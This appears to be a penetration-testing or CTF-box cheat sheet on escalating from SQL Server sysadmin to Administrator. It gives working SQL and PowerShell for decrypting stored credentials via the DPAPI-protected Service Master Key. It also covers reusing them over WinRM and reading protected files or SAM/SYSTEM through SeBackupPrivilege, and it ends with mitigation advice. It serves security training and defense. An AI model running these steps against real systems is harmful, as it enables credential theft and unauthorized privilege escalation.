---
title: MSSQL — decrypting credentials and abusing SeBackupPrivilege
tags: [windows, mssql, dpapi, sebackup, privesc]
---

# MSSQL: from sysadmin to cleartext credentials (and then to Administrator)

**English** | [🇪🇸 Español](mssql-credentials-sebackup.md)

General note for Windows boxes with a local SQL Server: what to do once you are sysadmin but the real goal is a service account or Administrator's desktop.

## 1. Confirm the context

```sql
SELECT SUSER_SNAME() AS login, SYSTEM_USER AS runs_as, IS_SRVROLEMEMBER('sysadmin') AS sa;
SELECT servicename, service_account, status_desc FROM sys.dm_server_services;
```

`xp_cmdshell` runs as the service account (`service_account`), not as your login. If that account is not admin, the shell cannot read protected files: go hunting for credentials.

Impersonation rights:

```sql
SELECT grantee.name AS who, permission_name, grantor.name AS granted_by
FROM sys.server_permissions p
JOIN sys.server_principals grantee ON grantee.principal_id = p.grantee_principal_id
JOIN sys.server_principals grantor ON grantor.principal_id = p.grantor_principal_id
WHERE permission_name = 'IMPERSONATE';
```

```sql
EXECUTE AS LOGIN='<login>'; SELECT SUSER_SNAME(), IS_SRVROLEMEMBER('sysadmin'); REVERT;
```

## 2. SQL Server credentials

```sql
SELECT credential_id, name, credential_identity FROM sys.credentials;

SELECT DATALENGTH(o.imageval) AS total,
       substring(o.imageval, 5, 16) AS iv,
       substring(o.imageval, 21, DATALENGTH(o.imageval) - 20) AS pass
FROM sys.credentials c
JOIN sys.sysobjvalues o ON c.credential_id = o.objid
WHERE o.valclass = 28 AND o.valnum = 2;
```

- `imageval` = `4-byte header | IV | ciphertext`.
- 16-byte IV and AES on SQL 2012+; 8 bytes and 3DES on SQL 2008.
- **`DATALENGTH`, never `LEN`**: `LEN` on `varbinary` stops at the first `0x00`.

## 3. Service Master Key via DPAPI

```sql
SELECT thumbprint, DATALENGTH(crypt_property) AS len,
       substring(crypt_property, 9, DATALENGTH(crypt_property) - 8) AS smk_blob
FROM sys.key_encryptions WHERE key_id = 102;
```

The SMK is protected with DPAPI `LocalMachine` plus an entropy value stored per instance:

```text
HKLM\SOFTWARE\Microsoft\Microsoft SQL Server\<instance>\Security  → Entropy
```

`<instance>` comes from `HKLM\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL`.
Mind the version: `MSSQL15` = SQL 2019, `MSSQL16` = 2022, `MSSQL17` = 2025. Read it before coding.

```powershell
Add-Type -AssemblyName System.Security
$ent = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL17.MSSQLSERVER\Security').Entropy
foreach ($b in $blobs) {
  try {
    $key = [System.Security.Cryptography.ProtectedData]::Unprotect($b, $ent, 'LocalMachine')
    break
  } catch { "failed: $($_.Exception.Message)" }
}
```

There are usually two rows (`thumbprint 01` and `03-00-00-00-01`); one fails, the other works. The resulting key is 32 bytes (AES-256) on modern installs; 16/24 would mean 3DES.

Decryption:

```powershell
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = 'CBC'; $aes.Padding = 'None'
$dec = $aes.CreateDecryptor($key, $iv)
$pt = $dec.TransformFinalBlock($ct, 0, $ct.Length)
[System.Text.Encoding]::Unicode.GetString($pt)
```

The plaintext is the password in UTF-16LE with leading padding; spot it by eye or by matching a readable pattern.

### Requirements

- A **DAC** connection to the local server: `Server=ADMIN:<host>;Trusted_Connection=True`.
- Sysadmin on that connection (the service account usually is).
- Ability to call DPAPI `LocalMachine`, which in practice any local user has.

## 4. Using the credential

```bash
nxc winrm <ip> -u '<user>' -p '<password>'
```

With WinRM open (5985/5986) this is the cleanest route. `nxc -x` with the `cmd` shell may report "no Invoke rights"; it falls back to PowerShell, where `&` is invalid: one command per call or `cmd /c ...`.

## 5. SeBackupPrivilege

```powershell
whoami /priv   # SeBackupPrivilege: Enabled  → read access equivalent to Administrator
```

```cmd
robocopy C:\Users\Administrator\Desktop C:\Users\Public root.txt /B
type C:\Users\Public\root.txt
```

`/B` enables backup mode and bypasses ACLs. `robocopy` returns exit code 1 when it copies: that is success, not an error.

Alternatives without `robocopy`: `SeBackupPrivilegeUtils`, or a manual copy of `SAM`/`SYSTEM` for `secretsdump`.

## 6. When it does not work

- The Agent proxy fails with "password is incorrect" → the stored secret is stale, but still decryptable.
- A step **without** a proxy runs as `NT Service\SQLSERVERAGENT`, a virtual account with no privileges.
- `OPENROWSET(BULK ...)` → needs `bulkadmin`; sysadmin is not enough.

## 7. Detection and mitigation

- Remove `IMPERSONATE` from application logins and audit `sys.server_permissions`.
- Disable `xp_cmdshell`; if required, use a least-privilege proxy.
- Rotate `sys.credentials` secrets and delete stale proxies.
- Watch SQL Agent job creation and DAC connections.
- Remove service accounts from `Backup Operators`; audit `SeBackupPrivilege` and `SeRestorePrivilege`.
- MITRE: T1505.001, T1059.001, T1548, T1003.
